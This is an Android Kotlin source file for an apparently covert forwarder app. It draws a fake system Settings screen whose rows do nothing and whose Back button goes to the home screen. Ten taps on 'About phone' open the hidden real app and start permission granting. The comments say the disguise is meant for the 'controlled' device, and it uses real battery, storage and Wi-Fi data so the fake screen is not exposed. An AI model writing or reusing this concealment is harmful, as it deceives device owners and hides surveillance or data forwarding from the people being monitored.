package cn.ppps.forwarder.activity

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.StatFs
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import java.util.Locale

/**
 * ★★★ 2026-11-03（用户明确的需求）「伪装成系统设置」的封面页。
 *
 * 现象要求：被控端点【运行】（启动服务）后，弹出一个**看起来像手机系统设置**的窗口；
 *   · 页面里每一项点击都**没有实际动作**（就是一张"设置"的皮）；
 *   · 只有在「关于手机」那一行**连续点击 10 次**，才进入真正的 App 界面并开始授权流程。
 *
 * 为什么这样实现（踩过的坑都在这里）：
 *  1. **不依赖任何主题/第三方控件**：全部用系统原生控件现场绘制。XUI 主题会把背景/字体
 *     改成品牌色，一眼就不像系统设置；而各家 ROM 的系统设置都是"白底 + 分组卡片 + 右侧 ›"。
 *  2. **返回键回桌面**（不是 finish 回 App）：否则用户按一下就露出真实界面，伪装等于没有。
 *  3. **连点判定要带超时重置**：手抖连点两次不该累计，因此相邻两次间隔超过
 *     [TAP_RESET_MS] 就从 1 重新数（与系统"连点版本号进开发者模式"的手感一致）。
 *  4. **真实入口带显式 extra**：[MainActivity] 只有收到 [EXTRA_GOTO_AUTH] 才会自动开始
 *     「一键授权」，避免正常打开 App 时莫名弹一堆权限框。
 */
class FakeSettingsActivity : Activity() {

    companion object {
        private const val TAG = "FakeSettings"
        /** 连点多少次进入真实界面（用户要求：10 次；2026-11-03 由 5 改成 10） */
        private const val REQUIRED_TAPS = 10
        /** 两次点击间隔超过它就从 0 重新计数 */
        private const val TAP_RESET_MS = 1500L
        /** 连点达标后带给 MainActivity 的口令：进入后立刻开始"一键授权" */
        const val EXTRA_GOTO_AUTH = "extra_goto_auth"
    }

    /** 已连点次数 / 上一次点击时间 */
    private var tapCount = 0
    private var lastTapAt = 0L

    // ==================== 颜色/字号（对齐 MIUI/HyperOS 设置页） ====================
    private val colorBg = Color.parseColor("#F2F3F5")
    private val colorCard = Color.WHITE
    private val colorTitle = Color.parseColor("#1B1B1B")
    private val colorSummary = Color.parseColor("#8A8A8E")
    private val colorGroup = Color.parseColor("#80868F")
    private val colorDivider = Color.parseColor("#ECECEC")
    private val colorChevron = Color.parseColor("#C8C8CC")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        applySystemBars()
        setContentView(buildContent())
    }

    /** 白色状态栏 + 深色图标：系统设置页就是这套配色，不这么设置一眼假 */
    private fun applySystemBars() {
        try {
            window.statusBarColor = colorCard
            window.navigationBarColor = colorCard
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                var flags = window.decorView.systemUiVisibility
                flags = flags or View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    flags = flags or View.SYSTEM_UI_FLAG_LIGHT_NAVIGATION_BAR
                }
                window.decorView.systemUiVisibility = flags
            }
        } catch (t: Throwable) {
            android.util.Log.w(TAG, "设置状态栏配色失败: ${t.message}")
        }
    }

    // ==================== 页面骨架 ====================
    private fun buildContent(): View {
        val root = LinearLayout(this)
        root.orientation = LinearLayout.VERTICAL
        root.setBackgroundColor(colorBg)
        root.layoutParams = ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT
        )

        // 顶部：返回箭头 + 大标题「设置」
        val header = LinearLayout(this)
        header.orientation = LinearLayout.VERTICAL
        header.setPadding(dp(20), dp(18), dp(20), dp(6))
        root.addView(header, LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
        ))

        val back = TextView(this)
        back.text = "‹"
        back.setTextColor(colorTitle)
        back.setTextSize(TypedValue.COMPLEX_UNIT_SP, 26f)
        back.gravity = Gravity.CENTER_VERTICAL
        back.setPadding(0, 0, 0, dp(2))
        // 返回箭头 = 回桌面（伪装页不露出真实 App）
        back.setOnClickListener { goHome() }
        header.addView(back)

        val title = TextView(this)
        title.text = "设置"
        title.setTextColor(colorTitle)
        title.setTextSize(TypedValue.COMPLEX_UNIT_SP, 30f)
        title.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL))
        title.setPadding(0, dp(4), 0, dp(10))
        header.addView(title)

        // 搜索框（纯装饰）
        val search = TextView(this)
        search.text = "搜索设置项"
        search.setTextColor(Color.parseColor("#9A9A9E"))
        search.setTextSize(TypedValue.COMPLEX_UNIT_SP, 15f)
        search.gravity = Gravity.CENTER_VERTICAL
        search.setPadding(dp(16), 0, dp(16), 0)
        search.background = rounded(Color.parseColor("#E9EAEC"), dp(12).toFloat())
        val searchLp = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(40)
        )
        header.addView(search, searchLp)
        search.setOnClickListener { /* 装饰项：点击无动作 */ }

        val scroll = ScrollView(this)
        scroll.isFillViewport = true
        scroll.overScrollMode = View.OVER_SCROLL_NEVER
        root.addView(scroll, LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f
        ))

        val list = LinearLayout(this)
        list.orientation = LinearLayout.VERTICAL
        list.setPadding(0, dp(4), 0, dp(28))
        scroll.addView(list, ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
        ))

        // ==================== 分组内容（与系统设置同一套叫法） ====================
        addGroup(list, "网络与连接", listOf(
            Row("WLAN", wifiSummary()),
            Row("蓝牙", "已开启"),
            Row("个人热点", "已关闭"),
            Row("连接与共享", "投屏、打印、附近分享")
        ))
        addGroup(list, "显示与声音", listOf(
            Row("显示", "深色模式 · 自动亮度"),
            Row("声音与振动", "媒体音量 40%"),
            Row("息屏与锁屏", "5 分钟")
        ))
        addGroup(list, "电池与存储", listOf(
            Row("电池", batterySummary()),
            Row("存储", storageSummary())
        ))
        addGroup(list, "应用与安全", listOf(
            Row("应用设置", "已安装应用"),
            Row("通知与控制中心", "锁屏通知 · 状态栏"),
            Row("密码与安全", "指纹 · 人脸 · 密码"),
            Row("隐私保护", "权限管理 · 拦截网")
        ))
        addGroup(list, "关于", listOf(
            // ★ 唯一的隐藏入口：连点 10 次进真实界面（其余行点了都没反应）
            Row("关于手机", aboutSummary(), hiddenEntry = true)
        ))

        return root
    }

    // ==================== 行/分组绘制 ====================
    private data class Row(val title: String, val summary: String, val hiddenEntry: Boolean = false)

    private fun addGroup(parent: LinearLayout, groupTitle: String, rows: List<Row>) {
        val label = TextView(this)
        label.text = groupTitle
        label.setTextColor(colorGroup)
        label.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13.5f)
        label.setPadding(dp(24), dp(18), dp(24), dp(8))
        parent.addView(label)

        val card = LinearLayout(this)
        card.orientation = LinearLayout.VERTICAL
        card.background = rounded(colorCard, dp(16).toFloat())
        val cardLp = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
        )
        cardLp.leftMargin = dp(12)
        cardLp.rightMargin = dp(12)
        parent.addView(card, cardLp)

        rows.forEachIndexed { index, row ->
            card.addView(buildRow(row))
            if (index != rows.size - 1) {
                val line = View(this)
                line.setBackgroundColor(colorDivider)
                card.addView(line, LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, 1
                ).also { it.leftMargin = dp(16) })
            }
        }
    }

    private fun buildRow(row: Row): View {
        val line = LinearLayout(this)
        line.orientation = LinearLayout.HORIZONTAL
        line.gravity = Gravity.CENTER_VERTICAL
        line.setPadding(dp(16), 0, dp(14), 0)
        line.layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(56)
        )

        val title = TextView(this)
        title.text = row.title
        title.setTextColor(colorTitle)
        title.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16f)
        line.addView(title, LinearLayout.LayoutParams(
            0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f
        ))

        if (row.summary.isNotEmpty()) {
            val summary = TextView(this)
            summary.text = row.summary
            summary.setTextColor(colorSummary)
            summary.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13f)
            summary.maxLines = 1
            summary.ellipsize = android.text.TextUtils.TruncateAt.END
            val slp = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT
            )
            slp.leftMargin = dp(8)
            line.addView(summary, slp)
        }

        val chevron = TextView(this)
        chevron.text = "›"
        chevron.setTextColor(colorChevron)
        chevron.setTextSize(TypedValue.COMPLEX_UNIT_SP, 20f)
        val clp = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT
        )
        clp.leftMargin = dp(6)
        line.addView(chevron, clp)

        // ★ 点击行为：普通行**什么都不做**（用户要求"点了没有实际操作"），
        //   只有「关于手机」这一行做 5 连点判定。
        line.setOnClickListener {
            if (row.hiddenEntry) onHiddenTap()
        }
        return line
    }

    // ==================== 5 连点 → 真实界面 ====================
    private fun onHiddenTap() {
        val now = System.currentTimeMillis()
        if (now - lastTapAt > TAP_RESET_MS) tapCount = 0
        lastTapAt = now
        tapCount++
        android.util.Log.i(TAG, "★ 隐藏入口连点: $tapCount/$REQUIRED_TAPS")
        if (tapCount >= REQUIRED_TAPS) {
            tapCount = 0
            openRealApp()
        }
    }

    /** 进入真实 App 界面，并带上"立即开始授权"的口令 */
    private fun openRealApp() {
        try {
            val i = Intent(this, MainActivity::class.java)
            i.putExtra(EXTRA_GOTO_AUTH, true)
            i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            startActivity(i)
        } catch (t: Throwable) {
            android.util.Log.w(TAG, "打开真实界面失败: ${t.message}")
        }
        finish()
    }

    /** 返回键 = 回桌面（绝不能让"返回"露出真实界面） */
    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        goHome()
    }

    private fun goHome() {
        try {
            val i = Intent(Intent.ACTION_MAIN)
            i.addCategory(Intent.CATEGORY_HOME)
            i.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(i)
        } catch (t: Throwable) {
            android.util.Log.w(TAG, "回桌面失败: ${t.message}")
        }
        finish()
    }

    // ==================== 装饰用数据（取真机信息，避免"假数字"露馅） ====================
    private fun aboutSummary(): String {
        return try {
            val brand = Build.MANUFACTURER.replaceFirstChar {
                if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString()
            }
            "$brand ${Build.MODEL} · Android ${Build.VERSION.RELEASE}"
        } catch (t: Throwable) {
            "本机 · Android ${Build.VERSION.RELEASE}"
        }
    }

    private fun batterySummary(): String {
        return try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            if (pct in 0..100) "电量 $pct%" else "电量信息读取中"
        } catch (t: Throwable) {
            "电量信息读取中"
        }
    }

    private fun storageSummary(): String {
        return try {
            val stat = StatFs(Environment.getDataDirectory().path)
            val freeGb = stat.availableBytes / 1024.0 / 1024.0 / 1024.0
            val totalGb = stat.totalBytes / 1024.0 / 1024.0 / 1024.0
            String.format(Locale.US, "可用 %.1f GB / 共 %.0f GB", freeGb, totalGb)
        } catch (t: Throwable) {
            "存储信息读取中"
        }
    }

    private fun wifiSummary(): String {
        return try {
            // getNetworkCapabilities 是 API 23+：低版本直接给个安全文案（minSdk 21）
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return "已连接"
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val caps = cm.getNetworkCapabilities(cm.activeNetwork)
            when {
                caps == null -> "未连接"
                caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "已连接"
                caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) ->
                    "已关闭（正在使用移动数据）"
                else -> "已连接"
            }
        } catch (t: Throwable) {
            "已连接"
        }
    }

    // ==================== 工具 ====================
    private fun dp(v: Int): Int = TypedValue.applyDimension(
        TypedValue.COMPLEX_UNIT_DIP, v.toFloat(), resources.displayMetrics
    ).toInt()

    private fun rounded(color: Int, radius: Float): GradientDrawable {
        val d = GradientDrawable()
        d.shape = GradientDrawable.RECTANGLE
        d.setColor(color)
        d.cornerRadius = radius
        return d
    }
}
